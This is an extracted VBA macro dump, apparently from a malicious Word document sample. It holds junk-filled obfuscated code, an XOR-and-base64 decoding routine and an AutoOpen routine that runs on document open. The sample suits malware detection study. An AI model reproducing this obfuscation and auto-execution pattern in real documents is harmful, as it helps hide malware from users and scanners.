@@ -1,0 +1,152 @@
+Filename     : ./macros/6970c39217fb7e239756f99edbd8ac9fe05093c7041fb9eb7ba769f859856ff9
+OLE stream   : Macros/VBA/ThisDocument
+VBA filename : ThisDocument.cls
+----------------------------------------
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Sub concert(adjustment)
+Dim bloodless As Integer
+Dim bring As Variant
+Dim barebone As Byte
+playoff = Left("cestare", 2) + Mid("heartgriefliomchrysolepis", 11, 4) + Mid("balaenopteraamisanthrope", 13, 1)
+grinder = apia
+Close #adjustment
+brigue = brigue And 398
+End Sub
+Sub CommentsCollectionObject()
+   Dim MyText As String
+   Dim MyRange As Object
+   Set MyRange = ActiveDocument.Range
+   MyText = "<Replace this with your text>"
+  ' Selection Example:
+  Selection.Comments.Add Range:=Selection.Range, Text:=MyText
+  ' Range Example:
+  MyRange.Comments.Add Range:=Selection.Range, Text:=MyText
+End Sub
+
+Sub BoldItalics1()
+    Selection.Font.Bold = True
+    Selection.Font.Italic = True
+End Sub
+
+Function bigness(ammoniuria) As String
+coquille = Lcase("spO") + Mid("selfcondemnationrophorecachinnation", 17, 7)
+
+Dim deflator(63) As Long
+Dim halfprice(63) As Long
+Dim swift As Long
+Dim muesli() As Byte
+Dim disuse As Long
+Dim bars As String
+Dim intermeddle() As Byte
+meropidae = meropidae - 106
+
+Dim demythologized As Long
+Dim breadbin As Integer
+Dim anni(255) As Byte
+Dim squalus(63) As Long
+Dim alder As Long
+incestuously = 262144
+tablefork = 75 - 80 - 15 + 275
+nontaxable = 46 + 23 + 187
+nanogram = 76 + 3956
+dollop = 47 - 100 + 3 + 16711730
+roadstead = 65280
+probability = 25 + 111 - 73
+cephaloridine = 19 + 120 + 3957
+sprag = 15 + 16515057
+barm = 258048
+buttinsky = 65536
+brim = 51 + 87 - 74
+Dim clatter As String
+Dim noctograph() As Byte
+noctograph = StrConv(ammoniuria, vbFromUnicode)
+Dim unproved As Integer
+For infomercial = 0 To UBound(noctograph)
+noctograph(infomercial) = noctograph(infomercial) Xor 8
+Next infomercial
+egganddart = 95 - 128 + 98 - 63
+Select Case egganddart
+Case 1 To 10
+asl = Left("raphoxinus", 2) & Ucase("VagE")
+balloonfish = "de" + Lcase("O")
+Case 11
+ctenidium = "inevitably"
+Case 15
+angles = auction
+irreclaimable = ginkgoaceae
+End Select
+
+pithead = StrConv(noctograph, vbUnicode)
+breadbin = 2
+tempestas = 122
+For swift = 0 To 255
+Select Case swift
+Case 65 To 90
+anni(swift) = swift - 65
+Case 97 To tempestas
+anni(swift) = swift - 71
+Case 48 To 57
+anni(swift) = swift + 4 + 0
+Case 43
+anni(swift) = 62
+Case 47
+anni(swift) = 63
+End Select
+Next swift
+For swift = 0 To 63
+halfprice(swift) = swift * brim
+deflator(swift) = swift * cephaloridine
+squalus(swift) = swift * incestuously
+Next swift
+muesli = StrConv(pithead, vbFromUnicode)
+sauk = 4
+ReDim intermeddle((((UBound(muesli) + 1) \ sauk) * 3) - 1)
+For demythologized = 0 To UBound(muesli) Step 4
+chorioallantois = muesli(demythologized)
+innate = 87 - 124 + 40
+alder = squalus(anni(chorioallantois)) + deflator(anni(muesli(demythologized + 1))) + _
+halfprice(anni(muesli(demythologized + 2))) + anni(muesli(demythologized + innate))
+swift = alder And dollop
+intermeddle(disuse) = swift \ buttinsky
+swift = alder And roadstead
+intermeddle(disuse + 1) = swift \ nontaxable
+intermeddle(disuse + 2) = alder And tablefork
+disuse = disuse + 3
+Next demythologized
+bars = StrConv(intermeddle, vbUnicode)
+If breadbin Then bars = Left$(bars, Len(bars) - breadbin)
+bigness = bars
+End Function
+
+Public Sub AutoOpen()
+Dim maoist As String
+Dim gendarmerie As Long
+begging = begging Xor 448
+Dim jack As Integer
+Dim heathenism As String
+jack = 25 Mod (8)
+begging = begging \ 277
+If jack < 13 - 486 Then
+begging = begging - 100
+BoldItalics1
+Else
+Dim cheilanthes As Variant
+grotty = bonk.InsideHeight
+For ceratopsia = 24 To 52
+islam = 52
+brigue = brigue \ 171
+jujutsu = Ucase("dE") & Left("gradtrenton", 4) & Right("closeoute", 1)
+jujutsu = Mid("deaconesspaflummox", 10, 2) & Right("decadencent", 2)
+Next ceratopsia
+
+End If
+End Sub
+
+
